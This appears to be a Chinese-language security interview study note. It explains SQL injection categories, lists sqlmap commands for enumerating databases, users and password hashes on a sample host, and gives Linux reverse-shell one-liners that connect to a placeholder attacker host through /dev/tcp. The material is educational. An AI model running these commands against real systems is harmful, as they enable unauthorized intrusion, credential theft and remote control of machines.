Q0

常见的SQL注入类型有哪些？并写出sqlmap检测SQL注入的命令？SQLMAPAPI怎么使用?

按注入点类型分类：

  • 数字型注入：select * from 表名 where id=1
  • 字符型注入：select * from 表名 where name=’admin’
  • 搜索型注入：select * from 表名 where 字段 like ‘%关键字%’

按提交的方式分类：

  • GET注入
  • POST注入
  • COOkie注入：HTTP 请求的时候会带上客户端的 Cookie, 注入点存在 Cookie 当中的某个字段中。

按执行效果来分类：

  • 基于布尔的盲注
  • 基于时间的盲注
  • 基于报错的注入
  • 可联合查询注入
  • 堆查询注入

SQLmap

检测注入点是否可用

  • python sqlmap.py -u “http:xxx”
  • 加 –batch //自动输入询问语句

暴库

  • python sqlmap.py -u “http://192.168.1.150/products.asp?id=134“ –dbs

web当前使用的数据库

  • python sqlmap.py -u “http://192.168.1.150/products.asp?id=134“ –current-db

web数据库使用账户

  • python sqlmap.py -u “http://192.168.1.150/products.asp?id=134“ –current-user

列出sqlsever所有用户

  • python sqlmap.py -u “http://192.168.1.150/products.asp?id=134“ –users

数据库账户与密码

  • python sqlmap.py -u “http://192.168.1.150/products.asp?id=134“ –passwords

数据库中的表

  • python sqlmap.py -u “http://192.168.1.150/products.asp?id=134“ -D 数据库名称 –tables

SQLMAPAPI

sqlmapapi.py就是提供了一个检查sql注入的接口，我们可以直接通过发送http请求扫描sql注入，获取扫描结果等一系列操作。

Q3.

列举Linux的反弹shell的一些方法

bash

  • bash -i >& /dev/tcp/vps_ip/端口号 0>&1

bash -i 生成一个交互式的子进程

&表示在Linux后台运行

/dev/tcp/vps_ip/端口号 其实是与主机建立tcp连接

/dev/[tcp|upd]/host/port是Linux里面比较特殊的文件，读取和写入相当于建立一个socket调用

0是标准输入，1是标准输出，2是错误输出，0>&1表示将标准输入重定向到标准输出，0>1表示将标准输入重定向到文件名为1的文件，&是用来区分的标识符（Linux默认不会把错误信息重定向到文件的

举个栗子， command >file 2>&1表示将标准输出重定向到file，然后错误输出重定向到标准输出，也就是又定向到了file，所以最后，标准输出和错误输出都定向到了file

exec

主机监听，靶机命令执行

exec 5<> /dev/tcp/vps_ip/端口号
